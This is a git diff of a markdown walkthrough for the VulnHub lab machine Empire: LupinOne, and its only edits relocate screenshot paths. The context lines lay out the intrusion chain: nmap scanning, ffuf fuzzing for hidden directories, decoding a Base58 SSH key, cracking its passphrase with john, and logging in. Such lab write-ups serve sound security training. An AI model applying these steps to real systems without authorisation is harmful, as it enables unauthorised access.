@@ -3,7 +3,7 @@
 - **Machine:** Empire: LupinOne
 - **Download:** https://www.vulnhub.com/entry/empire-lupinone,750/
 
-![](779-1.png)
+![](images/779-1.png)
 
 ---
 
@@ -24,7 +24,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](779-2.png)
+![](images/779-2.png)
 
 ---
 
@@ -36,7 +36,7 @@ Run a comprehensive Nmap scan to enumerate all open ports, services, operating s
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.227
 ```
 
-![](779-3.png)
+![](images/779-3.png)
 
 ---
 
@@ -60,7 +60,7 @@ This command performs an aggressive scan and runs the `http-enum` NSE script to 
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.227
 ```
 
-![](779-4.png)
+![](images/779-4.png)
 
 ---
 
@@ -83,7 +83,7 @@ Use **FFUF** to discover hidden user directories.
 ffuf -u http://192.168.2.227/~FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -ic -fc 403
 ```
 
-![](779-5.png)
+![](images/779-5.png)
 
 A hidden user directory is discovered.
 
@@ -93,7 +93,7 @@ Visit:
 http://192.168.2.227/~secret/
 ```
 
-![](779-6.png)
+![](images/779-6.png)
 
 The page suggests that **icex64** is a valid username.
 
@@ -107,7 +107,7 @@ Search for hidden files inside the `/~secret` directory.
 ffuf -u http://192.168.2.227/~secret/.FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -ic -fc 403 -e .txt,.php,.js,.html,.py
 ```
 
-![](779-7.png)
+![](images/779-7.png)
 
 ---
 
@@ -119,7 +119,7 @@ Visit:
 http://192.168.2.227/~secret/.mysecret.txt
 ```
 
-![](779-8.png)
+![](images/779-8.png)
 
 The file contains a Base58-encoded value.
 
@@ -131,7 +131,7 @@ Decode the Base58-encoded data.
 
 - https://emn178.github.io/online-tools/base58/decode/
 
-![](779-9.png)
+![](images/779-9.png)
 
 Save the decoded content as an SSH private key.
 
@@ -147,7 +147,7 @@ nano id_rsa
 chmod 600 id_rsa
 ```
 
-![](779-10.png)
+![](images/779-10.png)
 
 ---
 
@@ -165,7 +165,7 @@ Crack the passphrase.
 john hash.txt --wordlist=/usr/share/wordlists/fasttrack.txt
 ```
 
-![](779-11.png)
+![](images/779-11.png)
 
 The SSH key passphrase is successfully recovered.
 
@@ -186,7 +186,7 @@ Connect using the recovered private key.
 ssh -i id_rsa icex64@192.168.2.227
 ```
 
-![](779-12.png)
+![](images/779-12.png)
 
 Successful authentication provides shell access.
 
